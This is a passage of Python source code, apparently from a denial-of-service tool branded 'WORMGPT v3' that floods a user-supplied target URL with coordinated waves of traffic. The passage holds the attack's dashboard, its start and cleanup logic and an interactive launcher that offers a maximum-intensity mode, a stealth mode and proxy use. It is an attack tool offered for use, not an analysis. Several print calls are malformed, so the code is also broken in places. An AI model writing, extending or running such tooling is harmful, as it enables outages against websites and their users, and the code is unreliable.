            active_count = sum(1 for w in self.active_waves.values() if w)
            with self.coordination_lock:
                self.global_metrics['active_waves'] = active_count
                self.global_metrics['peak_intensity'] = max(
                    self.global_metrics['peak_intensity'],
                    active_count
                )
            
            time.sleep(1)
    
    def monitor_dashboard(self):
        """Real-time attack dashboard"""
        print(f"\n╔{'═'*80}╗")
        print(f"║{'MIXED WAVE COORDINATED ATTACK - WORMGPT v3'.center(80)}║")
        print(f"╚{'═'*80}╝")
        print(f"[+] Target: {self.target}")
        print(f("[+] Intensity: {self.intensity}/100"))
        print(f("[+] Duration: {self.duration if self.duration > 0 else 'Infinite'}s"))
        print(f"[+] Waves Configured: {len(self.wave_configs)}")
        print(f"[+] Press Ctrl+C to stop\n")
        
        last_update = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            
            # Check duration
            if self.duration > 0 and elapsed >= self.duration:
                break
            
            with self.coordination_lock:
                total_requests = self.global_metrics['total_requests']
                total_bytes = self.global_metrics['total_bytes']
                total_connections = self.global_metrics['total_connections']
                active_waves = self.global_metrics['active_waves']
                peak_intensity = self.global_metrics['peak_intensity']
            
            # Calculate metrics
            if elapsed > 0:
                rps = total_requests / elapsed
                mb_sent = total_bytes / (1024 * 1024)
                conn_rate = total_connections / elapsed
            else:
                rps = 0
                mb_sent = 0
                conn_rate = 0
            
            # List active waves
            active_wave_names = []
            for wave_type, is_active in self.active_waves.items():
                if is_active:
                    active_wave_names.append(wave_type.name.replace('_WAVE', ''))
            
            # Clear and display dashboard
            sys.stdout.write(f"\r[+] Time: {elapsed:6.1f}s | "
                           f"Active Waves: {active_waves:2d} ({', '.join(active_wave_names)}) | "
                           f"Requests: {total_requests:8d} | "
                           f"RPS: {rps:6.1f} | "
                           f"Connections: {total_connections:6d} | "
                           f"Data: {mb_sent:7.2f} MB | "
                           f"Peak: {peak_intensity:2d} waves")
            sys.stdout.flush()
            
            time.sleep(0.3)
    
    def start(self):
        """Start mixed wave attack"""
        # Start wave scheduler
        scheduler_thread = threading.Thread(target=self.wave_scheduler)
        scheduler_thread.daemon = True
        scheduler_thread.start()
        
        # Start dashboard
        dashboard_thread = threading.Thread(target=self.monitor_dashboard)
        dashboard_thread.daemon = True
        dashboard_thread.start()
        
        # Main loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopping mixed wave attack...")
        
        # Cleanup
        self.is_attacking = False
        
        # Stop all waves
        for wave_type in list(self.active_waves.keys()):
            self.stop_wave(wave_type)
        
        time.sleep(3)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        
        print(f"\n\n{'═'*85}")
        print(f"MIXED WAVE ATTACK COMPLETED")
        print(f"{'═'*85}")
        print(f"Target: {self.target}")
        print(f"Total Duration: {elapsed:.1f} seconds")
        print(f"Intensity Level: {self.intensity}/100")
        print(f"Total Requests: {self.global_metrics['total_requests']:,}")
        print(f"Requests Per Second: {self.global_metrics['total_requests']/elapsed if elapsed > 0 else 0:.1f}")
        print(f"Total Connections: {self.global_metrics['total_connections']:,}")
        print(f"Peak Concurrent Waves: {self.global_metrics['peak_intensity']}")
        print(f"Data Transferred: {self.global_metrics['total_bytes']/(1024*1024):.2f} MB")
        
        # Wave statistics
        print(f"\nWave Statistics:")
        print(f"{'─'*40}")
        for wave_type, metrics in self.wave_metrics.items():
            if metrics.end_time > 0:
                wave_duration = metrics.end_time - metrics.start_time
                wave_rps = metrics.requests_sent / wave_duration if wave_duration > 0 else 0
                print(f"{wave_type.name.replace('_WAVE', ''):15} | "
                      f"Duration: {wave_duration:5.1f}s | "
                      f"Requests: {metrics.requests_sent:6d} | "
                      f"RPS: {wave_rps:6.1f}")
        
        print(f"{'═'*85}")
        
        return {
            'duration': elapsed,
            'total_requests': self.global_metrics['total_requests'],
            'total_connections': self.global_metrics['total_connections'],
            'peak_waves': self.global_metrics['peak_intensity'],
            'bytes_sent': self.global_metrics['total_bytes'],
            'waves_executed': len(self.wave_metrics),
            'attack_type': 'MIXED WAVE (Coordinated Multi-Vector)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║               MIXED WAVE COORDINATED ATTACK - v3.0                  ║
║                      WORMGPT v3 | AXMods Team                       ║
║                 Multi-Vector Wave-Based DDoS System                 ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    # Get parameters
    try:
        intensity = int(input("[?] Attack intensity (1-100, default 50): ") or "50")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
        
        print(f"\n[+] Mixed Wave Attack Modes:")
        print(f("[+] 1. Standard Wave Assault (Recommended)"))
        print(f("[+] 2. Maximum Intensity (All waves at once)"))
        print(f("[+] 3. Stealth Wave Progression"))
        
        mode = input("[?] Select mode (1-3, default 1): ") or "1"
        
        if mode == "2":
            intensity = min(100, intensity * 2)
            print(f"[+] Intensity increased to {intensity} for maximum attack")
        elif mode == "3":
            intensity = max(20, int(intensity * 0.5))
            print(f("[+] Intensity reduced to {intensity} for stealth mode"))
        
    except Exception as e:
        print(f"[!] Invalid input: {e}, using defaults")
        intensity = 50
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = MixedWaveCoordinator(target, port, intensity, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
